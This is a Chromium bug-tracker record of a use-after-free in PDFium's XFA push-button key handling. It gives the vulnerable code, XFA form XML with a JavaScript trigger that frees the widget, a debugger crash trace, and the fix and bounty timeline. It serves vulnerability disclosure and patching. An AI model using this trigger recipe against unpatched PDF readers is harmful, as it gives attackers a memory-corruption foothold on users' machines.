# Security: PDFium (XFA) Use-after-free in CFWL_PushButton::OnKeyDown

| Field | Value |
|-------|-------|
| **Issue ID** | [40096030](https://issues.chromium.org/issues/40096030) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2019-08-20 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

CFWL\_PushButton object use-after-free in function CFWL\_PushButton::OnKeyDown.

**VERSION**  

Operating System: Windows 10 64bit  

Chrome with enabled XFA PDFium

**REPRODUCTION CASE**  

Open file `poc.pdf` in `chrome.exe` with PageHeap is enabled.  

Click left mouse button to push button `ClickMe` and press Enter to trigger crash.  

(I created a poc that has a push button covers all surface of the first page so you can click to anywhere inside page).

DETAIL INFORMATION

This bug is in function `CFWL_PushButton::OnKeyDown`

```
void CFWL_PushButton::OnKeyDown(CFWL_MessageKey\* pMsg) {  
  if (pMsg->m_dwKeyCode != XFA_FWL_VKEY_Return)  
    return;  
  
  CFWL_EventMouse wmMouse(this);  
  wmMouse.m_dwCmd = FWL_MouseCommand::LeftButtonUp;  
  DispatchEvent(&wmMouse);          => trigger JS callback by using `mouseUp` event    
  
  CFWL_Event wmClick(CFWL_Event::Type::Click, this);  
  DispatchEvent(&wmClick);  
}  

```

We can that the function `DispatchEvent()` is called with parameter is `FWL_MouseCommand::LeftButtonUp`. This will trigger JS handler of `mouseUp` event. In this handler, we can manage to delete `CFWL_PushButton` object (by using `xfa.template.remerge()` JS XFA function) => use-after-free issue in function `CFWL_PushButton::OnKeyDown` after return from JS code.

To trigger this bug, i created a poc file with a push button (name `pushButton0`) that has a XML form like this

```
<field h="500mm" name="pushButton0" w="500mm" x="1mm" y="1mm">  
	<ui>  
		<button/>  
	</ui>  
	<caption>  
		<value>  
			<text>ClickMe</text>  
		</value>  
	</caption>  
	<border>  
		<edge stroke="raised"/>  
	</border>  
	<event activity="mouseUp">  
		<script contentType="application/x-javascript">  
			count_mouseUp += 1;  
			if (count_mouseUp == 2)  
			{  
				f1 = xfa.resolveNode("xfa.form..field1");  
				xfa.host.setFocus(f1);  
				xfa.template.remerge();  
				xfa.host.openList(f1);  
			}  
		</script>  
	</event>  
</field>  

```

CRASH INFORMATION

```
(2078.43b0): Access violation - code c0000005 (first chance)  
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.  
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\pdfium.dll  
eax=00b7d4e0 ebx=00000000 ecx=46eb2fb0 edx=00b7d4e0 esi=4970efe0 edi=37d75b54  
eip=37ac69ef esp=00b7d4ac ebp=00b7d4c0 iopl=0         nv up ei pl nz ac pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216  
pdfium!CFWL_Widget::DispatchEvent+0xf:  
37ac69ef 83791000        cmp     dword ptr [ecx+10h],0 ds:002b:46eb2fc0=????????  
  
  
2:055> kp  
 # ChildEBP RetAddr    
00 00b7d4c0 37ac2c55 pdfium!CFWL_Widget::DispatchEvent(class CFWL_Event \* pEvent = 0x00b7d4e0)+0xf [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fwl\cfwl_widget.cpp @ 300]   
01 00b7d508 37ac271d pdfium!CFWL_PushButton::OnKeyDown(class CFWL_MessageKey \* pMsg = 0x4970efe0)+0x85 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fwl\cfwl_pushbutton.cpp @ 227]   
02 00b7d540 3769b5a6 pdfium!CFWL_PushButton::OnProcessMessage(class CFWL_Message \* pMessage = 0x4970efe0)+0x14d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fwl\cfwl_pushbutton.cpp @ 131]   
03 00b7d55c 37abf0c5 pdfium!CXFA_FFPushButton::OnProcessMessage(class CFWL_Message \* pMessage = 0x4970efe0)+0x36 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffpushbutton.cpp @ 194]   
04 00b7d5a4 37abee9c pdfium!CFWL_NoteDriver::DispatchMessageW(class CFWL_Message \* pMessage = 0x4970efe0, class CFWL_Widget \* pMessageForm = 0x46eb2fb0)+0x185 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fwl\cfwl_notedriver.cpp @ 148]   
05 00b7d5cc 37ac958a pdfium!CFWL_NoteDriver::ProcessMessage(class std::__1::unique_ptr<CFWL_Message,std::__1::default_delete<CFWL_Message> > pMessage =   
        unique_ptr {...})+0x5c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fwl\cfwl_notedriver.cpp @ 108]   
06 00b7d5f8 376802e1 pdfium!CFWL_WidgetMgr::OnProcessMessageToForm(class CFWL_Message \* pMessage = 0x00b7d644)+0x7a [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fwl\cfwl_widgetmgr.cpp @ 321]   
07 00b7d610 376810ff pdfium!CXFA_FFField::TranslateFWLMessage(class CFWL_Message \* pMessage = 0x00b7d644)+0x31 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_fffield.cpp @ 727]   
08 00b7d668 376a34e1 pdfium!CXFA_FFField::OnKeyDown(unsigned int dwKeyCode = 0xd, unsigned int dwFlags = 0)+0xbf [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_fffield.cpp @ 533]   
09 00b7d6a0 37666b6d pdfium!CXFA_FFWidgetHandler::OnKeyDown(class CXFA_FFWidget \* hWidget = 0x459eef88, unsigned int dwKeyCode = 0xd, unsigned int dwFlags = 0)+0x41 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffwidgethandler.cpp @ 131]   
0a 00b7d6e8 374a18d3 pdfium!CPDFXFA_WidgetHandler::OnKeyDown(class CPDFSDK_Annot \* pAnnot = 0x4741efd8, int nKeyCode = 0n13, int nFlag = 0n1024)+0x9d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\fpdfxfa\cpdfxfa_widgethandler.cpp @ 543]   
0b 00b7d750 374d23b1 pdfium!CPDFSDK_AnnotHandlerMgr::Annot_OnKeyDown(class CPDFSDK_Annot \* pAnnot = 0x4741efd8, int nKeyCode = 0n13, int nFlag = 0n1024)+0x1d3 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_annothandlermgr.cpp @ 255]   
0c 00b7d784 374f7491 pdfium!CPDFSDK_PageView::OnKeyDown(int nKeyCode = 0n13, int nFlag = 0n1024)+0x61 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_pageview.cpp @ 465]   
0d 00b7d7b8 1a7919e8 pdfium!FORM_OnKeyDown(struct fpdf_form_handle_t__ \* hHandle = 0x48d3efb0, struct fpdf_page_t__ \* page = 0x46afefe8, int nKeyCode = 0n13, int modifier = 0n1024)+0x61 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\fpdf_formfill.cpp @ 459]   
0e 00b7d870 1a790969 chrome!chrome_pdf::PDFiumEngine::OnKeyDown(class pp::KeyboardInputEvent \* event = 0x00b7d9a4)+0xb8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 1479]   
0f 00b7da78 1a7b57cd chrome!chrome_pdf::PDFiumEngine::HandleEvent(class pp::InputEvent \* event = 0x00b7dbe8)+0x249 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 778]   
10 00b7dbfc 18f56046 chrome!chrome_pdf::OutOfProcessInstance::HandleInputEvent(class pp::InputEvent \* event = 0x00b7dc2c)+0x60d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\out_of_process_instance.cc @ 838]   
11 00b7dc3c 36e7a457 chrome!pp::InputEvent_HandleEvent(int pp_instance = 0n-790066559, int resource = 0n334)+0x96 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\cpp\module.cc @ 53]   
12 00b7dc6c 36e7a3ea ppapi_proxy!ppapi::CallWhileUnlocked<PP_Bool,int,int,int,int>(<function> \* function = 0x18f55fb0, int \* p1 = 0x00b7dcc0, int \* p2 = 0x00b7dca4)+0x47 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\shared_impl\proxy_lock.h @ 136]   
13 00b7dcb8 36e7ad8e ppapi_proxy!ppapi::proxy::PPP_InputEvent_Proxy::OnMsgHandleFilteredInputEvent(int instance = 0n-790066559, struct ppapi::InputEventData \* data = 0x00b7de90, <unnamed-tag> \* result = 0x00b7dde0)+0xaa [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\ppp_input_event_proxy.cc @ 107]   
14 00b7dcfc 36e7acb8 ppapi_proxy!base::DispatchToMethodImpl<ppapi::proxy::PPP_InputEvent_Proxy \*,void (class ppapi::proxy::PPP_InputEvent_Proxy \*\* obj = 0x00b7df64, <function> \* method = 0x36e7a340, class std::__1::tuple<int,ppapi::InputEventData> \* in = 0x00b7de88, class std::__1::tuple<PP_Bool> \* out = 0x00b7dde0)+0x8e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\tuple.h @ 96]   
15 00b7dd60 36e7a2ac ppapi_proxy!base::DispatchToMethod<ppapi::proxy::PPP_InputEvent_Proxy \*,void (class ppapi::proxy::PPP_InputEvent_Proxy \*\* obj = 0x00b7df64, <function> \* method = 0x36e7a340, class std::__1::tuple<int,ppapi::InputEventData> \* in = 0x00b7de88, class std::__1::tuple<PP_Bool> \* out = 0x00b7dde0)+0x98 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\tuple.h @ 105]   
16 00b7df58 36e79c7d ppapi_proxy!IPC::MessageT<PpapiMsg_PPPInputEvent_HandleFilteredInputEvent_Meta,std::__1::tuple<int,ppapi::InputEventData>,std::__1::tuple<PP_Bool> >::Dispatch<ppapi::proxy::PPP_InputEvent_Proxy,ppapi::proxy::PPP_InputEvent_Proxy,void,void (class IPC::Message \* \*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\message_support.dll  
msg = 0x48764fb8 {size = 0x90}, class ppapi::proxy::PPP_InputEvent_Proxy \* obj = 0x48736fe8, class ppapi::proxy::PPP_InputEvent_Proxy \* sender = 0x48736fe8, <function> \* func = 0x36e7a340)+0x2cc [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ipc\ipc_message_templates.h @ 205]   
17 00b7dfd0 36db9627 ppapi_proxy!ppapi::proxy::PPP_InputEvent_Proxy::OnMessageReceived(class IPC::Message \* msg = 0x48764fb8 {size = 0x90})+0x14d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\ppp_input_event_proxy.cc @ 85]   
18 00b7e0ac 36e15aa5 ppapi_proxy!ppapi::proxy::Dispatcher::OnMessageReceived(class IPC::Message \* msg = 0x48764fb8 {size = 0x90})+0x127 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\dispatcher.cc @ 70]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\ipc.dll  
19 00b7e180 5a6f8a1f ppapi_proxy!ppapi::proxy::PluginDispatcher::OnMessageReceived(class IPC::Message \* msg = 0x48764fb8 {size = 0x90})+0x2f5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\plugin_dispatcher.cc @ 273]   
1a 00b7e1a0 5a6feb3f ipc!IPC::ChannelProxy::Context::OnDispatchMessage(class IPC::Message \* message = 0x48764fb8 {size = 0x90})+0x8f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ipc\ipc_channel_proxy.cc @ 323]   
1b 00b7e1c8 5a6fea1c ipc!base::internal::FunctorTraits<void (<function> \* method = 0x5a6f8990, class scoped_refptr<IPC::ChannelProxy::Context> \* receiver_ptr = 0x48764fb0 [0x5a7510d0] 0x4adbef10 {...}, class IPC::Message \* args = 0x48764fb8 {size = 0x90})+0x4f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 499]   
1c 00b7e208 5a6fe94f ipc!base::internal::InvokeHelper<0,void>::MakeItSo<void (<function> \*\* functor = 0x48764fa8, class scoped_refptr<IPC::ChannelProxy::Context> \* args = 0x48764fb0 [0x5a7510d0] 0x4adbef10 {...}, class IPC::Message \* args = 0x48764fb8 {size = 0x90})+0x7c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 599]   
1d 00b7e22c 5a6fe804 ipc!base::internal::Invoker<base::internal::BindState<void (<function> \*\* functor = 0x48764fa8, class std::__1::tuple<scoped_refptr<IPC::ChannelProxy::Context>,IPC::Message> \* bound = 0x48764fb0)+0x6f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 672]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\base.dll  
1e 00b7e254 60991bb0 ipc!base::internal::Invoker<base::internal::BindState<void (class base::internal::BindStateBase \* base = 0x48764f90)+0x54 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 641]   
1f 00b7e278 60b69963 base!base::OnceCallback<void (void)+0x50 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\callback.h @ 99]   
20 00b7e500 60bc0ed5 base!base::TaskAnnotator::RunTask(char \* trace_event_name = 0x60d5321c "SequenceManager RunTask", struct base::PendingTask \* pending_task = 0x00b7e848)+0x5b3 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\common\task_annotator.cc @ 144]   
21 00b7e8b8 60bc0501 base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow \* continuation_lazy_now = 0x00b7e958, bool \* ran_task = 0x00b7e973)+0x735 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 365]   
22 00b7e980 60a52300 base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork(void)+0xb1 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 218]   
23 00b7e9e0 60bc230c base!base::MessagePumpDefault::Run(class base::MessagePump::Delegate \* delegate = 0x47378f2c)+0x60 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\message_loop\message_pump_default.cc @ 39]   
24 00b7ec74 60afb535 base!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool application_tasks_allowed = true, class base::TimeDelta timeout = 9223372036854775807)+0x34c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 463]   
25 00b7ee78 60afb1e5 base!base::RunLoop::RunWithTimeout(class base::TimeDelta timeout = 9223372036854775807)+0x335 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\run_loop.cc @ 160]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\content.dll  
26 00b7eea4 1f235a9a base!base::RunLoop::Run(void)+0x45 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\run_loop.cc @ 135]   
27 00b7f090 22f6aeb6 content!content::PpapiPluginMain(struct content::MainFunctionParams \* parameters = 0x00b7f104)+0x5ca [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\ppapi_plugin\ppapi_plugin_main.cc @ 160]   
28 00b7f0bc 22f6bf05 content!content::RunOtherNamedProcessTypeMain(class std::__1::basic_string<char,std::__1::char_traits<char>,std::__1::allocator<char> > \* process_type = 0x00b7f120 "ppapi", struct content::MainFunctionParams \* main_function_params = 0x00b7f104, class content::ContentMainDelegate \* delegate = 0x00b7f6f4)+0xa6 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main_runner_impl.cc @ 578]   
29 00b7f278 22f677f0 content!content::ContentMainRunnerImpl::Run(bool start_service_manager_only = false)+0x2c5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main_runner_impl.cc @ 871]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\embedder.dll  
2a 00b7f290 3dac22e1 content!content::ContentServiceManagerMainDelegate::RunEmbedderProcess(void)+0x30 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_service_manager_main_delegate.cc @ 52]   
2b 00b7f610 22f6acdc embedder!service_manager::Main(struct service_manager::MainParams \* params = 0x00b7f634)+0x6d1 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\services\service_manager\embedder\main.cc @ 423]   
2c 00b7f65c 16891315 content!content::ContentMain(struct content::ContentMainParams \* params = 0x00b7f6d4)+0x5c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main.cc @ 20]   
2d 00b7f738 00c48e33 chrome!ChromeMain(struct HINSTANCE__ \* instance = 0x00c40000, struct sandbox::SandboxInterfaceInfo \* sandbox_info = 0x00b7f7cc, int64 exe_entry_point_ticks = 0n529085703264)+0x1f5 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\chrome_main.cc @ 110]   
2e 00b7f830 00c4147f chrome_exe!MainDllLoader::Launch(struct HINSTANCE__ \* instance = 0x00c40000, class base::TimeTicks exe_entry_point_ticks = class base::TimeTicks)+0x453 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\main_dll_loader_win.cc @ 202]   
2f 00b7fb10 00e76efe chrome_exe!wWinMain(struct HINSTANCE__ \* instance = 0x00c40000, struct HINSTANCE__ \* prev = 0x00000000)+0x47f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\chrome_exe_main_win.cc @ 234]   
30 00b7fb28 00e77051 chrome_exe!invoke_main(void)+0x1e [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 123]   
31 00b7fb80 00e7711d chrome_exe!__scrt_common_main_seh(void)+0x151 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 283]   
32 00b7fb88 00e77128 chrome_exe!__scrt_common_main(void)+0xd [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 326]   
33 00b7fb90 74930419 chrome_exe!wWinMainCRTStartup(void)+0x8 [f:\dd\vctools\crt\vcstartup\src\startup\exe_wwinmain.cpp @ 17]   
34 00b7fba0 76ff662d KERNEL32!BaseThreadInitThunk+0x19  
35 00b7fbfc 76ff65fd ntdll!__RtlUserThreadStart+0x2f  
36 00b7fc0c 00000000 ntdll!_RtlUserThreadStart+0x1b  

```

## Attachments

- [poc.pdf](attachments/poc.pdf) (application/pdf, 8.8 KB)
- [crash_info.txt](attachments/crash_info.txt) (text/plain, 20.4 KB)

## Timeline

### cl...@chromium.org (2019-08-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5668072431419392.

### cl...@chromium.org (2019-08-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-08-20)

Testcase 5668072431419392 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5668072431419392.

### mb...@chromium.org (2019-08-20)

tsepez: Would you mind taking a look at this or reassigning?

[Monorail components: Internals>Plugins>PDF]

### ts...@chromium.org (2019-08-20)

The .evt file to reproduce this under pdfium_test's --send-events option is:

mousedown,left,100,100
mouseup,left,100,100
keycode,13


### ts...@chromium.org (2019-08-22)

https://pdfium-review.googlesource.com/c/pdfium/+/59832 is a CL in the works.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-08-23)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194

commit 530f765067c8698e626976aa3dcf998e98371194
Author: Tom Sepez <tsepez@chromium.org>
Date: Fri Aug 23 19:04:16 2019

Observe FWL widgets in events/messages that destroy them.

Bug: chromium:995712
Change-Id: I3b1f8d9c31545aff4f2013cf6952791089cf65bc
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/59832
Reviewed-by: Lei Zhang <thestig@chromium.org>
Commit-Queue: Lei Zhang <thestig@chromium.org>

[add] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/testing/resources/javascript/xfa_specific/bug_995712_expected.txt
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_pushbutton.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_datetimepicker.cpp
[add] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/testing/resources/javascript/xfa_specific/bug_995712.evt
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_edit.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_checkbox.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_widgetmgr.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_widget.h
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_monthcalendar.cpp
[add] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/testing/resources/javascript/xfa_specific/bug_995712.in
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_message.h
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_event.h
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_eventmouse.h
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_combobox.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/530f765067c8698e626976aa3dcf998e98371194/xfa/fwl/cfwl_listbox.cpp


### th...@chromium.org (2019-08-23)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-08-24)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/f2943e7179d7878b4f81d0cc6caa44b3fff3a1e7

commit f2943e7179d7878b4f81d0cc6caa44b3fff3a1e7
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Sat Aug 24 09:25:58 2019

Roll src/third_party/pdfium cf9147a73748..ce0eecb10b14 (3 commits)

https://pdfium.googlesource.com/pdfium.git/+log/cf9147a73748..ce0eecb10b14

git log cf9147a73748..ce0eecb10b14 --date=short --no-merges --format='%ad %ae %s'
2019-08-24 dhoss@chromium.org Add tests for listbox form scrolling
2019-08-23 tsepez@chromium.org Observe FWL widgets in events/messages that destroy them.
2019-08-23 thestig@chromium.org Correctly account for Arabic characters in CFX_RTFBreak.

Created with:
  gclient setdep -r src/third_party/pdfium@ce0eecb10b14

The AutoRoll server is located here: https://autoroll.skia.org/r/pdfium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.


TBR=pdfium-deps-rolls@chromium.org

Bug: chromium:995712,chromium:996279
Change-Id: Icf1e10c7444e3b5c54f456bda6ac1bc531f6fb97
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1770075
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#690192}

[modify] https://crrev.com/f2943e7179d7878b4f81d0cc6caa44b3fff3a1e7/DEPS


### sh...@chromium.org (2019-08-24)

[Empty comment from Monorail migration]

### na...@google.com (2019-08-26)

[Empty comment from Monorail migration]

### na...@google.com (2019-08-28)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2019-08-28)

Congrats! The Panel decided to reward $7,500 for this report! 

### na...@google.com (2019-08-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-11-30)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2019-11-30)

This issue was migrated from crbug.com/chromium/995712?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40096030)*
